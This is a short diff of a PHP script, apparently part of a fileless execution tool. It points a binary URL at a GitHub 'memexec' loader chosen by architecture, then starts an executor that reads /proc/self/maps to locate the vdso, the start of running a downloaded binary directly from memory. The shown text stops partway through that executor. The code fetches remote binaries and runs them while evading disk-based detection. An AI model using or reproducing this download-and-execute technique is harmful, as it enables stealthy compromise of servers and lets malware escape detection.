@@ -1,4 +1,11 @@
-$binurl = "http://192.168.1.15/dataarm";
+$SERVER = "https://github.com/arget13/memexec/raw/main/";
+if(php_uname("m") == "x86_64")
+{ // x64
+    $binurl = $SERVER . "loader";
+} else { // Aarch64
+    $binurl = $SERVER . "loaderarm";
+}
+
 $executor='
 preg_match("/^.*vdso.*\$/m", file_get_contents("/proc/self/maps"), $matches);
 $vdso_addr = substr($matches[0], 0, strpos($matches[0], "-"));
